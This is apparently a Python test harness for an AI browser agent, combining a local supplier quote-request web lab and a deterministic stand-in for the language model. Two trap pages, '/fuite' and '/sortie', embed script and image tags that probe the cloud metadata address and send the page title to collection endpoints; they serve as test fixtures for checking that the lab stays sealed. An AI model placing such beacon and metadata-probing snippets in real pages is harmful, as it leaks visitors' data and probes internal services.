"""Laboratoire web local et décideur d'observation pour les tests réels de l'espace navigateur.

`Lab` : petite application de demande de devis fournisseur (portail, formulaire en deux étapes
dont l'ordre, l'ordre des champs et des liens varient selon une graine, bouton leurre, liste,
case à cocher, récapitulatif, confirmation POST avec référence, page « Mes demandes »,
téléchargement du récapitulatif). Aucune ressource externe ; les envois sont comptés en mémoire.

`ObservationDecider` : remplaçant déterministe du LLM pour les tâches `planification`, `action`
et `synthese`. Il ne connaît NI les URL internes, NI les refs, NI l'ordre des pages : à chaque
appel il lit la dernière observation renvoyée par les outils browser_* (arbre d'accessibilité)
et choisit l'action suivante à partir des libellés visibles et des faits de l'objectif, comme le
ferait le modèle. Tout le reste (superviseur, mission, outils, navigateur, garde, registre) est réel.
"""
from __future__ import annotations

import html
import json
import random
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit


class Lab:
    def __init__(self, seed: int = 0):
        self.seed = seed
        self.rng = random.Random(seed)
        self.draft: dict = {}
        self.submissions: list[dict] = []
        self.posts: list[str] = []
        self.on_confirm = None
        self.recap_downloadable = True
        self.contact_first = seed % 2 == 0
        self._lock = threading.Lock()
        lab = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.0"

            def log_message(self, *args):
                pass

            def do_GET(self):
                lab._get(self)

            def do_POST(self):
                length = int(self.headers.get("Content-Length") or 0)
                form = {k: v[0] for k, v in parse_qs(self.rfile.read(length).decode("utf-8")).items()}
                lab._post(self, form)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.server.daemon_threads = True
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    @property
    def origin(self) -> str:
        return f"http://127.0.0.1:{self.server.server_address[1]}"

    def start(self) -> "Lab":
        self.thread.start()
        return self

    def stop(self) -> None:
        self.server.shutdown()
        self.server.server_close()

    # -- rendu ---------------------------------------------------------------------------------
    def _shuffle(self, items: list) -> list:
        items = list(items)
        self.rng.shuffle(items)
        return items

    def _page(self, title: str, body: str) -> bytes:
        nav = " · ".join(self._shuffle(['<a href="/">Accueil</a>', '<a href="/mes-demandes">Mes demandes</a>',
                                        '<a href="/aide">Aide</a>']))
        return (f"<!doctype html><html lang=fr><head><meta charset=utf-8><title>{html.escape(title)}</title>"
                f"</head><body><nav>{nav}</nav><main>{body}</main></body></html>").encode("utf-8")

    def _send(self, handler, body: bytes, status: int = 200, headers: dict | None = None) -> None:
        handler.send_response(status)
        handler.send_header("Content-Type", (headers or {}).pop("Content-Type", "text/html; charset=utf-8"))
        for key, value in (headers or {}).items():
            handler.send_header(key, value)
        handler.send_header("Content-Length", str(len(body)))
        handler.end_headers()
        handler.wfile.write(body)

    def _redirect(self, handler, location: str) -> None:
        handler.send_response(303)
        handler.send_header("Location", location)
        handler.send_header("Content-Length", "0")
        handler.end_headers()

    def _field(self, name: str, label: str, required: bool = True) -> str:
        value = html.escape(str(self.draft.get(name, "")))
        req = " required" if required else ""
        return f'<p><label for="{name}">{label}</label> <input id="{name}" name="{name}" value="{value}"{req}></p>'

    def _step_contact(self, error: str = "") -> str:
        fields = self._shuffle([self._field("societe", "Raison sociale"),
                                self._field("email", "E-mail professionnel"),
                                self._field("tel", "Téléphone (facultatif)", required=False)])
        buttons = self._shuffle(['<button name="go" value="next">Étape suivante</button>',
                                 '<button name="go" value="draft" formnovalidate>Enregistrer le brouillon</button>'])
        return (f"<h1>Demande de devis — vos coordonnées</h1>{error}<form method=post action=/devis/etape>"
                f"<input type=hidden name=step value=contact>{''.join(fields)}{''.join(buttons)}</form>")

    def _step_besoin(self, error: str = "") -> str:
        options = "".join(f"<option>{o}</option>" for o in self._shuffle(["Traduction", "Relecture",
                                                                            "Interprétariat"]))
        fields = self._shuffle([
            f'<p><label for="prestation">Prestation</label> <select id="prestation" name="prestation">'
            f'<option value="">— choisir —</option>{options}</select></p>',
            self._field("quantite", "Nombre de documents"),
        ])
        return (f"<h1>Demande de devis — votre besoin</h1>{error}<form method=post action=/devis/etape>"
                f"<input type=hidden name=step value=besoin>{''.join(fields)}"
                f'<p><input type=checkbox id=cgv name=cgv value=1> <label for=cgv>J\'accepte les conditions '
                f"générales</label></p><button>Étape suivante</button></form>")

    def _missing(self, step: str) -> list[str]:
        needed = {"contact": ["societe", "email"], "besoin": ["prestation", "quantite", "cgv"]}[step]
        return [k for k in needed if not str(self.draft.get(k, "")).strip()]

    def _next_step(self) -> str | None:
        order = ["contact", "besoin"] if self.contact_first else ["besoin", "contact"]
        return next((s for s in order if self._missing(s)), None)

    # -- routes --------------------------------------------------------------------------------
    def _get(self, handler) -> None:
        path = urlsplit(handler.path).path
        if path == "/":
            links = self._shuffle(['<li><a href="/documentation">Documentation technique</a></li>',
                                   '<li><a href="/devis">Demander un devis</a></li>',
                                   '<li><a href="/tarifs">Tarifs publics</a></li>'])
            return self._send(handler, self._page("Portail fournisseurs Nova",
                                                  f"<h1>Portail fournisseurs Nova</h1><ul>{''.join(links)}</ul>"))
        if path == "/fuite":
            # Page piégée : tente de joindre une adresse interne (métadonnées cloud) et un hôte tiers.
            body = ('<h1>Offre spéciale</h1><img alt="pixel" src="http://169.254.169.254/latest/meta-data/">'
                    '<script>fetch("http://10.0.0.1/collect?d=" + document.title).catch(() => {});</script>')
            return self._send(handler, self._page("Offre", body))
        if path == "/sortie":
            # Page locale qui tente explicitement de joindre des domaines publics (image, fetch,
            # balise) : le laboratoire étant hermétique, rien ne doit sortir.
            body = ('<h1>Partenaires</h1><img alt="logo" src="https://www.gstatic.com/images/branding/logo.png">'
                    '<script>fetch("https://www.google.com/collect?d=" + encodeURIComponent(document.title))'
                    '.catch(() => {}); navigator.sendBeacon && navigator.sendBeacon("http://example.com/beacon", '
                    '"devis");</script>')
            return self._send(handler, self._page("Partenaires", body))
        if path in {"/documentation", "/tarifs", "/aide"}:
            return self._send(handler, self._page("Informations", "<h1>Informations</h1><p>Page informative "
                                                  "sans formulaire. Revenez à l'accueil pour une demande.</p>"))
        if path == "/devis":
            step = self._next_step()
            if step is None:
                return self._redirect(handler, "/devis/recapitulatif")
            body = self._step_contact() if step == "contact" else self._step_besoin()
            return self._send(handler, self._page("Demande de devis", body))
        if path == "/devis/recapitulatif":
            if self._next_step() is not None:
                return self._redirect(handler, "/devis")
            d = self.draft
            body = (f"<h1>Récapitulatif de votre demande</h1><p>Société : {html.escape(d['societe'])}</p>"
                    f"<p>Contact : {html.escape(d['email'])}</p><p>Prestation : {html.escape(d['prestation'])} "
                    f"× {html.escape(d['quantite'])}</p><form method=post action=/devis/confirmer>"
                    f"<button>Confirmer la demande</button></form><p><a href=/devis>Modifier</a></p>")
            return self._send(handler, self._page("Récapitulatif", body))
        match = re.fullmatch(r"/devis/confirmation/(DV-\d+)", path)
        if match:
            ref = match.group(1)
            body = (f"<h1>Demande enregistrée</h1><p>Référence : {ref}</p>"
                    f'<p><a href="/devis/recap/{ref}.txt">Télécharger le récapitulatif</a></p>')
            return self._send(handler, self._page("Confirmation", body))
        match = re.fullmatch(r"/devis/recap/(DV-\d+)\.txt", path)
        if match:
            sub = next((s for s in self.submissions if s["ref"] == match.group(1)), None)
            if sub is None or not self.recap_downloadable:
                return self._send(handler, b"introuvable", 404)
            text = json.dumps(sub, ensure_ascii=False).encode("utf-8")
            return self._send(handler, text, headers={"Content-Type": "text/plain; charset=utf-8",
                                                      "Content-Disposition": f'attachment; filename="{sub["ref"]}.txt"'})
        if path == "/mes-demandes":
            rows = "".join(f"<li>{s['ref']} — {html.escape(s['societe'])} — {html.escape(s['prestation'])} "
                           f"× {html.escape(s['quantite'])} — Demande enregistrée — "
                           f"<a href=\"/devis/recap/{s['ref']}.txt\">Télécharger le récapitulatif {s['ref']}</a></li>"
                           for s in self.submissions)
            body = f"<h1>Mes demandes</h1><ul>{rows}</ul>" if rows else "<h1>Mes demandes</h1><p>Aucune demande envoyée.</p>"
            return self._send(handler, self._page("Mes demandes", body))
        return self._send(handler, b"introuvable", 404)

    def _post(self, handler, form: dict) -> None:
        path = urlsplit(handler.path).path
        self.posts.append(path)
        if path == "/devis/etape":
            step = form.get("step")
            if form.get("go") == "draft":
                return self._send(handler, self._page("Brouillon", "<h1>Brouillon enregistré</h1>"
                                                      '<p><a href="/devis">Reprendre la demande</a></p>'))
            if step == "contact":
                for key in ("societe", "email", "tel"):
                    self.draft[key] = form.get(key, "").strip()
            elif step == "besoin":
                for key in ("prestation", "quantite", "cgv"):
                    self.draft[key] = form.get(key, "").strip()
            missing = self._missing(step) if step in {"contact", "besoin"} else ["?"]
            if missing:
                error = f"<p role=alert>Champ obligatoire manquant : {', '.join(missing)}</p>"
                body = self._step_contact(error) if step == "contact" else self._step_besoin(error)
                return self._send(handler, self._page("Demande de devis", body))
            return self._redirect(handler, "/devis")
        if path == "/devis/confirmer":
            if self._next_step() is not None:
                return self._redirect(handler, "/devis")
            with self._lock:
                ref = f"DV-{1001 + len(self.submissions)}"
                self.submissions.append({"ref": ref, **{k: self.draft[k] for k in ("societe", "email",
                                                                                   "prestation", "quantite")}})
            if self.on_confirm is not None:
                self.on_confirm(ref)
            return self._redirect(handler, f"/devis/confirmation/{ref}")
        return self._send(handler, b"introuvable", 404)


# --- décideur d'observation (remplaçant du LLM) ----------------------------------------------------

_LINE_RE = re.compile(r'^\s*-\s+(\w+)\s+"([^"]*)"(.*?)\[.*?ref=(e\d+).*?\]', re.MULTILINE)
_PROGRESS = ("étape suivante", "continuer", "suivant", "valider", "confirmer")
_AVOID = ("brouillon", "annuler", "supprimer", "modifier")


def _norm(text: str) -> str:
    return re.sub(r"\s+", " ", str(text)).strip().casefold()


class ObservationDecider:
    """Choisit l'action suivante à partir de l'observation courante et des faits de l'objectif."""

    def __init__(self, start_url: str | None, facts: dict[str, str], goal_keywords: tuple[str, ...] = ("devis",),
                 done_marker: str = "demande enregistrée", verify_link: str = "mes demandes"):
        self.start_url = start_url
        self.facts = {_norm(k): v for k, v in facts.items()}
        self.goal_keywords = tuple(_norm(k) for k in goal_keywords)
        self.done_marker = _norm(done_marker)
        self.verify_link = _norm(verify_link)
        self.calls: list[dict] = []
        self.observed: list[dict] = []

    # interface deepseek.call_json
    def __call__(self, agent, task, model, messages, max_tokens=None, reasoning=None, validate=None, **_):
        if task == "planification":
            goal = str(messages[-1]["content"])
            return {"tasks": [{"role": "GROWTH", "task": goal}]}
        if task == "synthese":
            return {"rapport": "Synthèse : " + " | ".join(str(m.get("content"))[:200] for m in messages[-1:])}
        decision = self.decide(messages)
        self.calls.append(decision)
        history = self._history(messages)
        if history:
            tool, result = history[-1]
            self.observed.append({"tool": tool, **{k: v for k, v in result.items() if k not in ("_page", "_action")},
                                  "page": result.get("_page", "")[:400]})
        return decision

    def decide(self, messages) -> dict:
        history = self._history(messages)
        last = history[-1] if history else None
        if last is None:
            url = self.start_url or self._url_in_goal(messages)
            return {"tool": "browser_navigate", "args": {"url": url}} if url else {"final": "aucune URL"}
        tool, result = last
        # Un refus ou une erreur ne renvoie pas de page : la dernière observation reste la référence.
        page = result.get("_page") or next((r.get("_page") for _t, r in reversed(history) if r.get("_page")), "")
        refused = str(result.get("reason") or "") if result.get("refused") else ""
        if refused and ("inconnu" in refused or "non vérifiée" in refused or "ne pas la" in refused):
            link = self._find(page, ("link",), self.verify_link)
            if link:
                return {"tool": "browser_click", "args": {"ref": "@" + link[2]}}
        if refused and "canal" in refused:
            return {"final": "Accès en écriture non accordé sur ce site : " + refused[:200]}
        if tool == "browser_download" and result.get("ok"):
            return {"final": f"Demande envoyée et vérifiée ; récapitulatif téléchargé ({result.get('file')})."}
        if tool == "browser_download":
            return {"final": "Demande envoyée et vérifiée, mais le récapitulatif n'a pas pu être téléchargé : "
                             + str(result.get("error") or result.get("reason") or "")[:200]}
        if not page:
            return {"tool": "browser_snapshot", "args": {}}
        elements = _LINE_RE.findall(page)
        text = _norm(page)
        pending = [h for h in history if (h[1].get("effect") or {}).get("status") in ("executed", "ambiguous")]
        ambiguous = [h for h in history if h[1].get("status") == "ambiguous"] or \
            [h for h in history if (h[1].get("reprise") or {}).get("ambiguous_actions")]
        if self.verify_link in _norm(result.get("title", "")) and self.done_marker in text:
            action_id = self._ambiguous_id(history)
            if action_id is not None and not any(h[0] == "browser_verify" for h in history[-1:]):
                return {"tool": "browser_verify", "args": {"text": "Demande enregistrée", "action_id": action_id}}
        if result.get("already_done"):
            # Déjà fait (tentative précédente) : retrouver le résultat sur le site plutôt que refaire.
            link = self._find(page, ("link",), self.verify_link)
            if link:
                return {"tool": "browser_click", "args": {"ref": "@" + link[2]}}
        if self.done_marker in text and not any(h[0] == "browser_download" and h[1].get("ok") for h in history):
            link = self._find(page, ("link",), "télécharger")
            if link:
                ref = re.search(r"DV-\d+", link[1]) or re.search(r"DV-\d+", page)
                return {"tool": "browser_download", "args": {"ref": "@" + link[2],
                                                             "filename": f"{ref.group(0) if ref else 'recap'}.txt"}}
        if tool == "browser_verify" and result.get("verified"):
            return {"final": "Action ambiguë vérifiée sur le site : demande bien enregistrée, pas de second envoi."}
        # remplir les champs connus de la page
        done_here = self._done_on_page(history)
        for role, name, _attrs, ref in elements:
            key = self._fact_for(name)
            if role in ("textbox", "searchbox") and key and ("type", name) not in done_here:
                return {"tool": "browser_type", "args": {"ref": "@" + ref, "text": self.facts[key]}}
            if role == "combobox" and key and ("select", name) not in done_here:
                return {"tool": "browser_select", "args": {"ref": "@" + ref, "value": self.facts[key]}}
            if role == "checkbox" and "condition" in _norm(name) and ("check", name) not in done_here:
                return {"tool": "browser_check", "args": {"ref": "@" + ref}}
        buttons = [(r, n, ref) for r, n, _a, ref in elements if r == "button"
                   and any(p in _norm(n) for p in _PROGRESS) and not any(a in _norm(n) for a in _AVOID)]
        if buttons:
            role, name, ref = buttons[0]
            args = {"ref": "@" + ref}
            if "confirmer" in _norm(name):
                args["expect"] = "Demande enregistrée"
            return {"tool": "browser_click", "args": args}
        link = next(((r, n, ref) for r, n, _a, ref in elements if r == "link"
                     and any(k in _norm(n) for k in self.goal_keywords)), None)
        if link:
            return {"tool": "browser_click", "args": {"ref": "@" + link[2]}}
        return {"final": "Aucune action pertinente visible sur la page."}

    @staticmethod
    def _url_in_goal(messages) -> str | None:
        for message in messages:
            if message.get("role") == "user" and str(message.get("content", "")).startswith("Objectif"):
                match = re.search(r"https?://[^\s)»,;]+", str(message["content"]))
                if match:
                    return match.group(0)
        return None

    def _ambiguous_id(self, history) -> int | None:
        for tool, result in reversed(history):
            if result.get("status") == "ambiguous" and result.get("action_id"):
                return int(result["action_id"])
            actions = (result.get("reprise") or {}).get("ambiguous_actions") or []
            if actions:
                return int(actions[-1]["action_id"])
            match = re.search(r"#(\d+)", str(result.get("reason") or ""))
            if result.get("refused") and match:
                return int(match.group(1))
        return None

    def _fact_for(self, label: str) -> str | None:
        label = _norm(label)
        return next((k for k in self.facts if k in label), None)

    def _find(self, page: str, roles: tuple, needle: str):
        return next(((r, n, ref) for r, n, _a, ref in _LINE_RE.findall(page)
                     if r in roles and needle in _norm(n)), None)

    def _done_on_page(self, history) -> set:
        """Actions de saisie déjà faites depuis la dernière arrivée sur la page courante."""
        done: set = set()
        for tool, result in reversed(history):
            action = result.get("_action") or {}
            if tool in ("browser_navigate", "browser_click", "browser_back") and not action.get("_edit"):
                break
            if tool in ("browser_type", "browser_select", "browser_check") and result.get("ok"):
                done.add((tool.split("_", 1)[1], action.get("_label")))
        return done

    def _history(self, messages) -> list[tuple[str, dict]]:
        """(outil, résultat) des appels browser_* ; le libellé ciblé est retrouvé dans la page d'avant."""
        out: list[tuple[str, dict]] = []
        pending_action = None
        last_page = ""
        for message in messages:
            content = str(message.get("content") or "")
            if message.get("role") == "assistant":
                try:
                    pending_action = json.loads(content)
                except ValueError:
                    pending_action = None
                continue
            match = re.match(r"Résultat de (browser_\w+) : (.*)", content, re.DOTALL)
            if not match:
                continue
            tool, body = match.group(1), match.group(2)
            head, _, page = body.partition("\nPAGE (refs @eN) :\n")
            try:
                result = json.loads(head)
            except ValueError:
                result = {"ok": False, "error": head[:200]}
            ref = str(((pending_action or {}).get("args") or {}).get("ref") or "").lstrip("@")
            label = next((n for _r, n, _a, rf in _LINE_RE.findall(last_page) if rf == ref), None)
            result["_action"] = {"_label": label, "_edit": False}
            result["_page"] = page
            if page:
                last_page = page
            out.append((tool, result))
        return out


def install_decider(monkeypatch_or_module, decider: ObservationDecider) -> None:
    from agents import deepseek
    if hasattr(monkeypatch_or_module, "setattr") and not isinstance(monkeypatch_or_module, type(deepseek)):
        monkeypatch_or_module.setattr(deepseek, "call_json", decider)
    else:
        deepseek.call_json = decider


def wait_until(predicate, timeout: float = 30.0, interval: float = 0.1) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return True
        time.sleep(interval)
    return bool(predicate())


def _worker_main(argv: list[str]) -> int:
    """Worker OCTOPUS réel dans un processus séparé (tué par le test pendant l'envoi)."""
    import argparse
    import os
    import sys
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent
    sys.path.insert(0, str(root))
    parser = argparse.ArgumentParser()
    parser.add_argument("--facts", required=True)
    parser.add_argument("--lease", type=float, default=3.0)
    args = parser.parse_args(argv)
    from agents import deepseek, runtime, task_handlers  # noqa: F401
    from octopus import builtin_handlers, llm, worker  # noqa: F401

    def no_network(provider, request):
        raise AssertionError("aucun appel LLM réseau dans le laboratoire")

    llm._transport_override = no_network
    deepseek.call_json = ObservationDecider(None, json.loads(args.facts))
    worker.load_handlers(["octopus.builtin_handlers"])
    print(f"worker pid {os.getpid()} prêt", flush=True)
    worker.loop(poll_s=0.1, lease_s=args.lease, log=lambda line: print(line, flush=True))
    return 0


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "worker":
        raise SystemExit(_worker_main(sys.argv[2:]))
